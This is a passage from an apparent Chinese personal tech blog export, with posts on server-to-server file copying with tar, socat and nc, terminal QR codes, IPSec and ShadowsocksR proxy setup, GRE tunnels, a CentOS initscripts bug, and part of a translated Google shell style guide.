# server A &amp; server B上都要执行yum -y install tar socat;# server A(ip:1.1.1.1)上执行cd dest_path;socat tcp4-listen:11111 stdout | tar xvpf -# server B上执行cd src_path;tar cvf - files | socat stdin tcp4:1.1.1.1:11111# server B上的src_path/files==&gt;server A的dest_path/files# 在千兆环境下，拷贝速度可以稳定达到800M以上。


如果是单个的大文件，直接 socat 即可，代码跟上面类似
如果不追求性能和速度，scp 即可，代码略

进一步优化# 2024.1.11 更新# 接收端(B)：socat TCP-LISTEN:11111 STDOUT | tar xzv# 发送端（A）：tar czvf - src | socat - TCP:B:11111# 确认比 nc 更厉害，因为同样的情况，使用 nc 被挂住了（多次实验，皆被挂住）


如果网络带宽不大而且没有加密需求的话，可以给 tar 启用压缩，格式用性能最好的 xz

# server A &amp; server B上都要执行yum -y install tar socat xz;# server A(ip:1.1.1.1)上执行cd dest_path;socat tcp4-listen:11111 stdout | tar xJvpf -# server B上执行cd src_path;tar cJvf - files | socat stdin tcp4:1.1.1.1:11111# 在千兆环境下，拷贝速度只有10M(压缩后)左右。

如果从命令行简洁程度来讲，还不如直接用 nc 呢。:)

# server A &amp; server B上都执行yum -y install nc;# server A(ip:1.1.1.1)上执行cd dest_path;nc -4l 11111 | tar xv# server B上执行cd src_path;tar cvf - files | nc -q 0 1.1.1.1 11111# 上面命令里的 &quot;-q 0&quot; 的意思是发完数据就发一个完成标识，避免数据已然传完但 nc 进程一直挂着的现象
]]></content>
      <tags>
        <tag>tips</tag>
        <tag>nc</tag>
        <tag>socat</tag>
        <tag>scp</tag>
        <tag>rsync</tag>
      </tags>
  </entry>
  <entry>
    <title>用命令行生成字符组成的二维码</title>
    <url>/2017/08/%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%94%9F%E6%88%90%E5%AD%97%E7%AC%A6%E7%BB%84%E6%88%90%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/index.html</url>
    <content><![CDATA[方法一curl qrenco.de/http:\/\/m.theyan.gs
系统输出：
██████████████████████████████████████████████████████████████████████ ▄▄▄▄▄ █ ▀▀▄  ██▀█ ▄▄▄▄▄ ████████ █   █ ███ ▄▄▄████ █   █ ████████ █▄▄▄█ █ ▄▄ █▀▄███ █▄▄▄█ ████████▄▄▄▄▄▄▄█ █ ▀ █▄▀ █▄▄▄▄▄▄▄████████ ▄ ██▄▄▀   ██ ▄▀▄   ▄▀█  ████████▄▀█▀▀ ▄▄▄▀█▄█▀█  █▄ ▀ ▄█▄████████▄▄▀▀▀▀▄ █ █▄ ▄█▀ █ ▄███▀ ████████▄▄  ██▄▀ ▀ ▀ ▄ ▄█▄█▀ ▄▄█▄████████▄▄▄▄█▄▄█ ▄▄██  ▄ ▄▄▄ █▀▄▀████████ ▄▄▄▄▄ █▀▄▀▄█▀█▀ █▄█ ▄█▀ ████████ █   █ ██▀ ▄ ▄█ ▄ ▄▄  ▀ ▄████████ █▄▄▄█ █  █▀ ▄  ▀ █▀ ██▄▄████████▄▄▄▄▄▄▄█▄████▄▄█▄█▄██▄██▄██████████████████████████████████████████████████████████████████████
方法二echo "http://m.theyan.gs" | curl -F-=\&lt;- qrenco.de
得到的系统输出是：
██████████████████████████████████████████████████████████████████████ ▄▄▄▄▄ █ ▄▄ █ ██▀█ ▄▄▄▄▄ ████████ █   █ ██▄█▀▀▄████ █   █ ████████ █▄▄▄█ █ ▀▀▄ ▀▄███ █▄▄▄█ ████████▄▄▄▄▄▄▄█ ▀▄█▄█▄▀ █▄▄▄▄▄▄▄████████▄▄ █▀ ▄▀ ▄█▄  ▄▀▄   ▄▀█  ████████▄▄ ██▄▄  ▄ ▀ █▄  █▄ ▀ ▄█▄█████████▀▄▄▀█▄▀▄▄ ██ ▄▀ █ ▄███▀ ████████▄▄ █  ▄▀  ▄▄█▀█▄█▄█▀ ▄▄█▄████████▄▄▄▄██▄▄▀▄ ▄ ▄█▄ ▄▄▄ █▀▄▀████████ ▄▄▄▄▄ █▀▄▄▀ ▄ ▀ █▄█ ▄██▄████████ █   █ ██ ▄██   ▄ ▄▄  ▀▀▄████████ █▄▄▄█ █ ▀▀▄█▀█ ▀ █▀ ██▄▄████████▄▄▄▄▄▄▄█▄▄█▄▄▄██▄█▄██▄██▄██████████████████████████████████████████████████████████████████████
检测结果用二维码识别软件检测上面这两个二维码，发现都是：“http://m.theyan.gs”
]]></content>
      <tags>
        <tag>二维码</tag>
        <tag>QR code</tag>
        <tag>qrenco.de</tag>
      </tags>
  </entry>
  <entry>
    <title>给ios10在ubuntu 14.04上配置IPSec服务器</title>
    <url>/2016/10/%E7%BB%99ios10%E5%9C%A8ubuntu-14-04%E4%B8%8A%E9%85%8D%E7%BD%AEipsec%E6%9C%8D%E5%8A%A1%E5%99%A8/index.html</url>
    <content><![CDATA[写在前面的闲话后面有篇文章，为 iOS 在 CentOS6.x 上搭建 IPSec(PSK+XAuth) VPN 服务器，说的是一样的事情，只不过平台是 CentOS 6.x。
有朋友看了本文后问，这种文章百度上不多的是吗，干嘛还要写？然后我就想这个问题也许还真有代表性，于是就把文章修改下，统一回答：

网上的方案多是ipsec+l2tp或者是ipsec+xl2tp的，我觉得不需要那么复杂，有ipsec加密数据流就OK了，所以我这方案应该是满足需求的最简方案
我写东西，多半是为了心理安慰。而且这也不算是完全原创，准确讲应该是实验报告，参照的是最后参考里列出的国外的那篇文档

缘起(Why)需求还是来自于科学上网，iPhone设备的科学上网。话说自打最新的iOS中

不再支持pptp方式的vpn了
没有全局性的ss(Shadowsocks)可用
OpenVPN的客户端软件市场中都看不见(Tunnelblicck是没找到)

所以，为了iPhone的科学上网，我们只有自力更生，搭建新的服务器系统。这里，我选用的是IPsec服务器。


具体步骤(Howto)环境准备环境是一台ubuntu 14.04的机器(代号：Trusty Tahr)。
安装软件首先，我们需要安装必需软件：
apt-get install strongswan \	strongswan-plugin-xauth-generic;

参数调整sysctl -w net.ipv4.ip_forward=1;echo \	&quot;sysctl -w net.ipv4.ip_forward=1&quot; \	&gt;&gt; /etc/rc.local;

iptables/sbin/iptables -t nat \	-A POSTROUTING \	-s 10.0.0.0/8 \	-o eth0 \	-j MASQUERADE;echo \	&quot;/sbin/iptables -t nat \		-A POSTROUTING \		-s 10.0.0.0/8 \		-o eth0 \		-j MASQUERADE&quot; \	&gt;&gt; /etc/rc.local;

修改配置ipsec.secretscat &lt;&lt;EOF &gt;/etc/ipsec.secrets: PSK sharekeystring user1 : XAUTH &quot;password for user1&quot;user2 : XAUTH &quot;password for user2&quot;EOF
注意：

user1和user2分别是用户名，相应后面的passw…….是密码
sharekeystring是共享秘钥，客户端连过来时也会用

ipsec.confcat &lt;&lt;EOF &gt;/etc/ipsec.confconfig setup	charondebug=&quot;ike 4, knl 4, cfg 4, net 4, esp 4, dmn 4,  mgr 4&quot;	cachecrls=yes	uniqueids=yes	 conn ios	keyexchange=ikev1	authby=xauthpsk	xauth=server	left=%defaultroute	leftsubnet=0.0.0.0/0	leftfirewall=yes	right=%any	rightsubnet=10.0.0.0/24	rightsourceip=10.0.0.1/24	rightdns=8.8.8.8	auto=addEOF
这里解释下参数charondebug，上面的例子都是4是为了调试排错的需要的，当你的服务正常以后，请将这个参数值改小。
启动服务# （手工）启动服务service strongswan start;# 将服务设置为自启动update-rc.d strongswan enable;

排错及维护
log文件是*&#x2F;var&#x2F;log&#x2F;strongswan.charon.log*

ipsec status;ipsec statusall;# 以上两个命令可以用来看状态

ios客户端配置在iphone上，点击设置–&gt;VPN–&gt;**添加 VPN 配置…**，然后：

类型：IPSec
描述：随便填
服务器：填部署IPSec服务的ip地址或域名
账户：上面的例子中是user1或user2
密码：上面的文件里有
使用证书：不使用证书
秘钥：上面配置文件里有

参考
strongSwan 5 based IPSec VPN, Ubuntu 14.04 LTS and PSK&#x2F;XAUTH

]]></content>
      <tags>
        <tag>IPSec</tag>
        <tag>PSK</tag>
        <tag>Ubuntu</tag>
        <tag>iOS</tag>
        <tag>iPhone</tag>
        <tag>strongSwan</tag>
        <tag>XAuth</tag>
        <tag>Trusty Tahr</tag>
        <tag>KVM</tag>
      </tags>
  </entry>
  <entry>
    <title>科学上网之 SSR 方案</title>
    <url>/2017/10/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E4%B9%8B-SSR-%E6%96%B9%E6%A1%88/index.html</url>
    <content><![CDATA[缘起最近上面在开会嘛，职能部门也许是要展示下“肌肉”：“不是我搞不了你，我只是平时懒得鸟你。”我猜大概就是这么个原因吧，结果就是：最近这段时间大家的“科学上网”纷纷中招，不好使了。我司原来用的 SS 改良的版本，中招了，至于怎么解决的，不在本篇讨论的范围之内。
我主要说下家里的情况，家里原来也是 SS 方案，这段时间也不行了，通常是早上不通了，改下端口，然后到晚上又不行了，然后又改端口，搞了两次才是反应过来是被盯上了。心中大呼侥幸！这要是不封端口直接封 IP 我可咋整呀？！就冲这点来讲不得不说职能部门真是良心单位哈，值得点个赞！
现有资源
米国 VPS 一台（Ubuntu 16.04）
家里路由器一台（OpenWrt 14.07，bcrm63xx 架构）

以前也是这情况，不过以前跑的是 SS，据说 SSR 比 SS 更不容易被 ban，所以这次我的方案是用 SSR 替换掉原来的 SS。

SSR 方案具体（替换）过程这里不赘述了，中间来来回回走过不少弯路，说起来都是泪呀，只谈下最终的方案的情况吧，这也是我推荐的方案。
VPS 端VPS 上起 Docker 服务，然后直接拉一个 SSR 的 Docker image 来跑。
Server 端部署这里的部署文档参考了：DigitalOcean 的 How To Install and Use Docker on Ubuntu 16.04 和 Docker 官方的 Get Docker CE for Ubuntu
# 删除掉以前的 Docker，至于为什么用 purge 而不是 remove，自己想apt-get purge docker docker-engine docker.io;apt-get update;apt-get install \    apt-transport-https \    ca-certificates \    curl \    software-properties-common;# 添加 Docker 官方的 GPG keycurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -;# 新增 Docker 的官方 repoadd-apt-repository \   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \   $(lsb_release -cs) \   stable";   apt-get update;# 安装 Docker（Docker 新版叫 docker-ce）apt-get install docker-ce;# 拉一个 SSR 的 Docker（image） 跑起来docker run -p 11402:51348 \	--restart=always \	--name=SSR \	-e PASSWORD=xxxxxxxxxxx \	-d breakwa11/shadowsocksr;
需要注意的是，上面跑的这个 Docker image，其实是有很多隐含参数的，如果不知道，SSR 客户端是没法连过来的，具体详见 Docker image:breakwa11/shadowsocksr 的 Dockerfile 文件。考虑到被职能部门 ban 的可能性，我把缺省参数贴出来：

ENV SERVER_ADDR     0.0.0.0ENV SERVER_PORT     51348ENV PASSWORD        pswENV METHOD          aes-128-ctrENV PROTOCOL        auth_aes128_md5ENV PROTOCOLPARAM   32ENV OBFS            tls1.2_ticket_auth_compatibleENV TIMEOUT         300ENV DNS_ADDR        8.8.8.8ENV DNS_ADDR_2      8.8.4.4   

OpenWrt 端家里的 OpenWrt 上肯定是跑 SSR 的客户端，由于种种原因（主要是测试时服务器用的是 aws，当时貌似不支持 udp 转发），最终域名解析用了 pdnsd 的方案而不是 tunnel 方案。
Client 端部署在 github 上找了个 brcm63xx 的 ShadowsocksR for OpenWrt 的 ipk 包，下载地址在这里，如果你的 OpenWrt 路由器是别的体系架构的话，也许这个页面里还能找到更新一点的版本。
# 删除掉 dnsmasq（如果已安装的话），因为需要安装 dnsmasq-fullopkg remove dnsmasq;# 安装 pdnsd 和 dnsmasq-full，此方案里有用到opkg install pdnsd dnsmasq-full;# 不要自动启动 pdnsd，ShadowsockR 会将其起起来/etc/init.d/pdnsd disable;# 下载 ShadowsocksR 软件包wget https://github.com/bettermanbao/openwrt-shadowsocksR-libev-full/releases/download/v2.4.5-5/shadowsocksR-libev-full_2.4.5-5_brcm63xx-generic.zip;unzip shadowsocksR-libev-full_2.4.5-5_brcm63xx-generic.zip;cd shadowsocksR-libev-full_2.4.5-5_brcm63xx-generic;# 下面这步是安装，如果依赖什么包没装，就 opkg install 安装后再继续opkg install \	shadowsocksr-libev-server-polarssl_2.4.5-5_brcm63xx.ipk;
Client 端配置SSR Client 的参数配置参照上面服务器的配置即可，但是有两点区别：

PROTOCOLPARAM 参数可以留空不配
OBFS 配成 tls1.2_ticket_auth 即可

客户端的配置工作可以在 web 界面来做，而且也推荐这么做
Client 端启动/etc/init.d/shadowsocksr start;# 服务的启动也可以在 web 界面来做，推荐这样做，因为简单。
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>科学上网</tag>
        <tag>Shadowsocks</tag>
        <tag>ShadowsocksR</tag>
        <tag>SS</tag>
        <tag>SSR</tag>
        <tag>OpenWrt</tag>
        <tag>pdnsd</tag>
        <tag>dnsmasq-full</tag>
        <tag>Xenial</tag>
      </tags>
  </entry>
  <entry>
    <title>路遇CentOS6.9的initscripts的bug</title>
    <url>/2017/04/%E8%B7%AF%E9%81%87CentOS6-9%E7%9A%84initscripts%E7%9A%84bug/index.html</url>
    <content><![CDATA[缘起某台机器（CentOS 6.*）升级到最新的 6.9 版本，重启结果发现以前开机自起的 GRE 设备 greXXX 没有自动起来？！

发现问题最初怀疑是 iptables 没有放开 GRE 数据包的入站导致，结果发现不是，而且手工 ifup greXXX 能直接将这个设备起来。
于是查代码 /etc/init.d/network，发现这段：
if [ "$TYPE" = "IPSEC" ] || [ "$TYPE" = "IPIP" ] || [ "$TYPE" = "GRE" ]; then        vpninterfaces="$vpninterfaces $i"        continuefi
看起来设备 greXXX 被放到变量 vpninterfaces 里了，但是再翻遍 /etc/init.d/network，也没发现最后要把 vpninterfaces 怎么着呀，这到底是个什么情况呀？！
在 /etc/init.d/network 发现还有一段：
# Bring up xDSL and VPN interfacesfor i in $vlaninterfaces $bridgeinterfaces $xdslinterfaces ; do    if ! LANG=C egrep -L "^ONBOOT=['\"]?[Nn][Oo]['\"]?" ifcfg-$i &gt;/dev/null 2&gt;&amp;1 ; then        # If we're in confirmation mode, get user confirmation.        if [ -f /var/run/confirm ]; then                confirm $i                test $? = 1 &amp;&amp; continue        fi        action $"Bringing up interface $i: " ./ifup $i boot        [ $? -ne 0 ] &amp;&amp; rc=1    fidone
看见没有看见没有，注释里写了这一段会启动 xDSL 和 VPN 设备的，但是在具体的代码里，却又为嘛把变量 vpninterfaces 丢掉了呀？！这个程序员得有多粗心呀！
查一下
rpm -qf /etc/init.d/network
发现这个文件是属于包：initscripts-9.03.58-1.el6.centos.x86_64，再接着查：
rpm -qV initscripts
发现包 initscripts 里的文件 /etc/init.d/network 没有被修改过。所以猜想可能是 bug，google 上一查，果不其然，在这里：0013020: initscripts 9.03.58-1.el6.centos breaks gre interfaces
解决办法来龙去脉搞明白了，解决问题其实非常简单，可以直接修改文件 /etc/init.d/network，但我不想这么做，因为 CentOS 官方迟早是会修复这个 bug 的，不用我来凑这个热闹。不过目前的问题的话，直接在 /etc/rc.local 里加一句，手工起这个设备算了：
echo "/etc/sysconfig/network-scripts/ifup greXXX"&gt;&gt;/etc/rc.local
]]></content>
      <categories>
        <category>System</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>GRE</tag>
        <tag>bash</tag>
        <tag>6.9</tag>
        <tag>initscripts</tag>
        <tag>bug</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下用GRE隧道直接联通两个私网</title>
    <url>/2016/08/Linux%E4%B8%8B%E7%94%A8GRE%E9%9A%A7%E9%81%93%E7%9B%B4%E6%8E%A5%E8%81%94%E9%80%9A%E4%B8%A4%E4%B8%AA%E7%A7%81%E7%BD%91/index.html</url>
    <content><![CDATA[概述这篇文档其实主要讲的是行内关于“打洞”的事情。
什么叫“打洞”通过在两个私网之间打一条隧道（tunnel）而把他们连接起来的方法，行内俗称“打洞”，其实专业的说法应该是“搭建隧道”，在两个能路由的两个单独的私有网络之间搭建一条隧道（tunnel）以便于两个私网之间能够直接互通。
为什么要“打洞”刚需这个恐怕对于大多数互联网企业来讲，都是绕不开的需求。互联网公司大多有好些单独的私网，比如，每个单独的办公环境都有单独的私网吧，还有托管机房是不是也有单独的私网？如果用了公有云的话，那么每个公有云是不是也有单独的私网？而“打洞”就是为了把这些网络无缝的连接起来，组成一张大的“内网”。显而易见有几个好处：

办公网的每一个用户可以自动漫游，无需修改配置而访问办公网的每一个节点
办公、管理都走私网，貌似更显得专业、安全一些

中小企业场景我们这里主要讲中小企业常用的Linux+GRE+tunnel方案，为什么不提大型企业呢？因为大公司大多直接采购专业的网络设备来做类似的工作了，更有甚者，直接租用点对点专线来直连各个私网，所以高富帅的生活我等屌丝不懂，也就不在这里讨论了。
怎样“打洞”下面就以在CentOS6.x(CentOS7.x其实是一样的)下为例来讲下怎样打洞（GRE tunnel），其他Linux发行版下的情况可以同理推之。
场景一如下图所示：两个私网的网关都分别直接有公网地址。这个场景应该是最普遍的场景。

注意：上图由如下graphviz代码生成。&lt;graphviz dot&gt;digraph G &#123;  rankdir=&quot;LR&quot;;  GA [shape=box, label=&quot;GW_A&quot;];  NetA [label=&quot;NetA\n10.0.0.0/24&quot;];  GA -&gt; NetA [dir=none, taillabel=&quot;.1&quot;];  GA -&gt; Internet [dir=none, taillabel=&quot;1.1.1.1&quot;];  Internet [label=&quot;internet&quot;];  Internet -&gt; GB [dir=none, headlabel=&quot;2.2.2.2&quot;];  GB [shape=box, label=&quot;GW_B&quot;];  GB -&gt; NetB [dir=none, taillabel=&quot;.1&quot;];  NetB [label=&quot;NetB\n10.0.1.0/24&quot;];  GA -&gt; GB [dir=&quot;none&quot;, style=&quot;dotted&quot;, label=&quot;GRE tunnel&quot;, headlabel=&quot;gw&quot;, taillabel=&quot;gw&quot;, constraint=false];  &#123;rank=same GA NetA&#125;  &#123;rank=same GB NetB&#125;&#125;&lt;/graphviz&gt;
这个配置是最好写了，在GW_A上写配置文件/etc/sysconfig/network-scripts/ifcfg-gw
DEVICE=gwONBOOT=yesTYPE=GREPEER_OUTER_IPADDR=2.2.2.2PEER_INNER_IPADDR=10.0.1.0/24MY_INNER_IPADDR=10.0.0.1KEY=haw-haw.orgBOOTPROTO=none
同样的，在GW_B上写配置文件/etc/sysconfig/network-scripts/ifcfg-gw
DEVICE=gwONBOOT=yesTYPE=GREPEER_OUTER_IPADDR=1.1.1.1PEER_INNER_IPADDR=10.0.0.0/24MY_INNER_IPADDR=10.0.1.1KEY=haw-haw.orgBOOTPROTO=none
最后，分别在GW_A和GW_B上分别激活网络设备gw即可，具体命令是：
ifup gw;
场景二如下图所示：只有一个私网的网关（GW_B）直接有公网地址，另外一个(GW_A)没有直接接公网，但是它在Firewall A设备上有个一对一的NAT(ip是1.1.1.1)，这个情况就稍稍复杂一些。

注意：上图由如下graphviz代码生成。&lt;graphviz dot&gt;digraph G &#123;  newrank=true;  rankdir=LR;  compound=true;  FWA [shape=box, label=&quot;Firewall A&quot;];  subgraph cluster_NetA &#123;    rankdir=LR;    graph [style=&quot;dotted&quot;];    label=&quot;NetA\n10.0.0.0/24&quot;;    GA [shape=box, label=&quot;GW_A\n.1&quot;];  &#125;  Internet [label=&quot;internet&quot;];  GB [shape=box, label=&quot;GW_B&quot;];  NetB [label=&quot;NetB\n10.0.1.0/24&quot;];  FWA -&gt; GA [dir=&quot;none&quot;, lhead=&quot;cluster_NetA&quot;, minlen=2];  FWA -&gt; Internet [dir=none, taillabel=&quot;1.1.1.1&quot;, minlen=2, labeldistance=2];  GA -&gt; Internet [dir=none, style=&quot;dashed&quot;, taillabel=&quot;1.1.1.1(NAT)&quot;, constraint=false, labeldistance=3];  Internet -&gt; GB [dir=none, headlabel=&quot;2.2.2.2&quot;, minlen=1.5, labeldistance=2];  GB -&gt; NetB [dir=none, taillabel=&quot;.1&quot;];  GA -&gt; GB [dir=&quot;none&quot;, style=&quot;dotted&quot;, label=&quot;GRE tunnel&quot;, headlabel=&quot;gw&quot;, taillabel=&quot;gw&quot;, constraint=false, labeldistance=1];  &#123;rank=same GB NetB&#125;  &#123;rank=same FWA GA&#125;&#125;&lt;/graphviz&gt;
在GW_A上写配置文件/etc/sysconfig/network-scripts/ifcfg-gw
DEVICE=gwONBOOT=yesTYPE=GREPEER_OUTER_IPADDR=2.2.2.2PEER_INNER_IPADDR=10.0.1.0/24MY_INNER_IPADDR=10.0.0.1KEY=haw-haw.orgBOOTPROTO=none
同样的，在GW_B上写配置文件/etc/sysconfig/network-scripts/ifcfg-gw
DEVICE=gwONBOOT=yesTYPE=GREPEER_OUTER_IPADDR=1.1.1.1PEER_INNER_IPADDR=10.0.0.0/24MY_INNER_IPADDR=10.0.1.1KEY=haw-haw.orgBOOTPROTO=none
最后，分别在GW_A和GW_B上分别激活网络设备gw即可，具体命令是：
ifup gw;
细心的人会发现，这两种场景下配置文件是一样的！对，就是一样的。:)
场景三如下图所示：两个私网的网关（GW_A和GW_B）都没有公网地址，都是通过防火墙设备(Firewall A和Firewall B)上分别做的一对一的NAT(ip分别是1.1.1.1和2.2.2.2)。

注意：上图由如下graphviz代码生成。&lt;graphviz dot&gt;digraph G &#123;  newrank=true;  rankdir=LR;  compound=true;  FWA [shape=box, label=&quot;Firewall A&quot;];  subgraph cluster_NetA &#123;    rankdir=LR;    graph [style=&quot;dotted&quot;];    label=&quot;NetA\n10.0.0.0/24&quot;;    GA [shape=box, label=&quot;GW_A\n.1&quot;];  &#125;  Internet [label=&quot;internet&quot;];  FWB [shape=box, label=&quot;Firewall B&quot;];  subgraph cluster_NetB &#123;    rankdir=LR;    graph [style=&quot;dotted&quot;];    label=&quot;NetB\n10.0.1.0/24&quot;;    GB [shape=box, label=&quot;GW_B\n.1&quot;];  &#125;  FWA -&gt; Internet [dir=none, taillabel=&quot;1.1.1.1&quot;, minlen=2, labeldistance=2];  Internet -&gt; FWB [dir=&quot;none&quot;, headlabel=&quot;2.2.2.2&quot;, minlen=2, labeldistance=2];  FWA -&gt; GA [dir=&quot;none&quot;, lhead=&quot;cluster_NetA&quot;, minlen=2];  FWB -&gt; GB [dir=&quot;none&quot;, lhead=&quot;cluster_NetB&quot;, minlen=2];  GA -&gt; Internet [dir=none, style=&quot;dashed&quot;, taillabel=&quot;1.1.1.1(NAT)&quot;, constraint=false, labeldistance=3];  Internet -&gt; GB [dir=none, style=&quot;dashed&quot;, headlabel=&quot;2.2.2.2(NAT)&quot;, minlen=1.5, labeldistance=2];  GA -&gt; GB [dir=&quot;none&quot;, style=&quot;dotted&quot;, label=&quot;GRE tunnel&quot;, headlabel=&quot;gw&quot;, taillabel=&quot;gw&quot;, constraint=false, labeldistance=1];  &#123;rank=same FWB GB&#125;  &#123;rank=same FWA GA&#125;&#125;&lt;/graphviz&gt;
GW_A和GW_B上的配置，跟前两种场景是一样的。
调整MTU这点很重要！不做这个的话你的网络也许会出各种各样的神奇问题！：）
方法很简单，在GW_A和GW_B的机器上分别执行
iptables -t mangle \    -A FORWARD \    -p tcp \    -m tcp \    --tcp-flags SYN,RST SYN \    -j TCPMSS \    --clamp-mss-to-pmtu;
优点这样配置的好处是显而易见的：
避免引入互联IP行内其他的方案其实也差不多，唯一比较大的区别是其他方案一般都会在GW_A和GW_B的隧道虚接口gw上配上互联IP地址来用于互通，然后把对端的私有网络地址段的路由指向对端隧道虚接口gw的互联IP。这样做其实也能实现功能，但是有几个问题：

网关机器GW_A和GW_B跟对端私网的非网关的其他机器的私网通讯可能会有问题，需要其他机器上到互联ip所在网段的路由正好指向本网段的网关地址
简单看是仅多一对互联IP，但其实是整多一个互联网段！这对于ip地址及网络的维护带来的工作量不能低估

配置文件维护方便
保证重启服务器、重启网络甚至于重启网络设备都会正确读取配置
虚接口也可以单独启停，维护起来相当方便
维护模式相当清晰，改动起来非常方便

其他启停命令ifup gw;# startifdown gw;# stop
需要注意的是：在以上三种场景中，都需要确认在NetA和NetB网络中机器上到10.0.1.0/24和10.0.0.0/24的路由分别指向了GW_A和GW_B(可以分别在default gw上做)
静态路由在某些具体的场景下，比如NetA后面还接的有NetC，IP地址段是172.16.1.0/24，那么为了让NetB和NetC能私网互通，则必须要在NetB的网关GW_B上将NetC的地址172.16.1.0/24指向NetA的网关地址GW_A才行，这种情况下只需要在GW_B上编辑配置文件/etc/sysconfig/network-scripts/route-gw，其内容如下：
172.16.1.0/24 dev gw src 10.0.1.1
这样设置的静态路由会在ifup gw;
时自动被启用，ifdown gw;
时自动删除，能不能不要这么方便、人性化！
存在问题本文话题到此就结束了，但是安全意识强的同学就会马上意识到：这种方式把几个不同的网络连成了一个大三层的网络，的确是很方便，但是网络之间的通讯没有被加密，直接明文传输，是不是不太合适？好问题！所以，下一篇文章我们将讲一下怎样把网络之间的流量加密一下。请看，进阶阅读：CentOS6.x下用ipsec加密GRE隧道。
]]></content>
      <tags>
        <tag>GRE</tag>
        <tag>tunnel</tag>
      </tags>
  </entry>
  <entry>
    <title>google的shell（编程）风格指南</title>
    <url>/2017/02/google%E7%9A%84shell%EF%BC%88%E7%BC%96%E7%A8%8B%EF%BC%89%E9%A3%8E%E6%A0%BC%E6%8C%87%E5%8D%97/index.html</url>
    <content><![CDATA[背景（Background）使用哪种 Shell(Which Shell to Use)Bash是唯一被允许执行的shell脚本语言。
可执行文件必须以 #!/bin/bash 和最小数量的标志开始。请使用 set 来设置 Shell 的选项，使得用 bash &lt;script_name&gt; 调用你的脚本时不会破坏其功能。限制所有的可执行 Shell 脚本为 Bash 使得我们安装在所有计算机中的 Shell 语言保持一致性。对此唯一例外的是当你被迫时可以不这么做的。例如 Solaris SVR4，需要用纯 Bourne shell。

何时使用 Shell(When to use Shell)Shell 应该仅仅被用于小工具或者简单的包装脚本。
尽管 Shell 脚本不是一种开发语言，但在整个谷歌它被用于编写多种实用工具脚本。这个风格指南更多的是认同它的使用，而不是一个建议，即它可被用于广泛部署。以下是一些准则：

如果你主要是在调用其他的工具并且做一些相对很小数据量的操作，那么使用Shell 来完成任务是一种可接受的选择。
如果你在乎性能，那么请选择其他工具，而不是使用 Shell。
如果你发现你需要在任何地方使用数组而不是变量赋值（如 ${PHPESTATUS} ），那么你应该使用 Python 脚本。
如果你将要编写的脚本会超过 100 行，那么你可能应该使用 Python 来编写，而不是 Shell。记住：脚本长度会增加，尽早使用另外一种语言重写你的脚本，以避免之后花更多的时间来重写。[^1]

Shell 文件和解释器调用(Shell Files and Interpreter Invocation)文件扩展名(File Extensions)可执行文件应该没有扩展名（强烈建议）或者使用 .sh 扩展名。库文件必须使用 .sh 作为扩展名，而且应该是不可执行的。
当执行一个程序时，并不需要知道它是用什么语言编写的。而且 Shell 脚本也不要求有扩展名。所以我们更喜欢可执行文件没有扩展名。然而，对于库文件，知道其用什么语言编写的是很重要的，有时候会需要使用不同语言编写的相似的库文件。使用 .sh 这样特定语言后缀作为扩展名，就使得用不同语言编写的具有相同功能的库文件可以采用一样的名称。
SUID/SGIDSUID 和 SGID 在 Shell 脚本上是被禁止的。
Shell 有着很多的安全性问题以至于在 Shell 上安全启用 SUID/SGID 几乎是不可能的。虽然 Bash 使得使用 SUID 很困难，但是在某些平台上还是有可能的，这也是为什么我们要明确禁止使用 SUID/SGID 的原因。如果你需要高的存取（权限）请使用 sudo。
环境(Environment)标准输出对比错误输出(STDOUT vs STDERR)所有的错误信息应该输入到标准错误输出（STDERR）中。
这使得从实际问题中分离出正常状态变得更容易。下面这个函数是用于打印出错误信息以及其他状态信息的功能，值得推荐。
err() &#123;  echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $@" &gt;&amp;2&#125;if ! do_something; then  err "Unable to do_something"  exit "$&#123;E_DID_NOTHING&#125;"fi
注释(Comments)文件头(File Header)在每个文件开头处添加一段描述内容。
每个文件必须有一个顶层注释，内容包含了内容的简短概述。一个版权 (copyright) 声明，还有作者信息时可选的。例如：
#!/bin/bash## Perform hot backups of Oracle databases.
函数注释(Function Commets)任何不能同时具备（功能）显而易见且短小的函数都必须有注释。任何库函数，无论其长度大小和复杂性都必须要有注释。
对其他人来讲仅通过阅读注释来学会使用你的程序或库中的函数应该是可能的。所有的函数注释应该包含如下的内容: 

函数的描述信息 
使用的和修改的全局变量 
参数信息 
返回值而不是最后一条命令的缺省退出状态码 

例子:
#!/bin/bash## Perform hot backups of Oracle databases.export PATH='/usr/xpg4/bin:/usr/bin:/opt/csw/bin:/opt/goog/bin'######################################## Cleanup files from the backup dir# Globals:#   BACKUP_DIR#   ORACLE_SID# Arguments:#   None# Returns:#   None#######################################cleanup() &#123;  ...&#125;
实现的注释(Implementation Comments)对你的代码中含有技巧的，不明显的，有趣的，或者是一些重要的部分添加注释。
遵循 Google 的通用编码注释的做法。不要所有代码都加注释。如果有一个复杂的算法，或者是你在做一个与众不同的功能，在这些地方放置一个简单的注释即可。
TODO 的注释(TODO Comments)在临时的、短期解决方案的、或者足够好但不够完美的代码处添加 TODO 注释。
这与 C++ 指南中的约定相一致。所有的 TODO 类别的注释，应该包含一个全部大写的字符串 TODO，后面用括号包含您的用户名。冒号是可选的。这里最好把 bug 号，或者是 ticket 号放在TODO 注释后面。例如：
# TODO(mrmonkey): Handle the unlikely edge cases (bug ####)
格式(Formatting)虽然你需要遵循你正在修改的文件的风格，但是新的代码必须要遵循下面的风格。
缩进(Indentation)按照 2 个空格来缩进，不使用 tab 来缩进。
在两个语句块中间使用空白行来提高可读性。缩进使用两个空格。无论你做什么，不要使用制表符（tab）。对于现有的文件，保留现有使用的缩进，
行长度和长字符串(Line Length and Long Strings)一行的长度最多是 80 个字符.
如果你必须要写一个长于 80 个字符的字符串，如果可能的话，你应该尽量使用 here document 或者嵌入一个新行，如果有一个文字字符串长度超过了 80 个字符，并且不能合理的分割文字字符串，但是强烈推荐你找到一种办法让它更短一点。
# DO use 'here document'scat &lt;&lt;END;I am an exceptionally longstring.END# Embedded newlines are ok toolong_string="I am an exceptionally  long string."
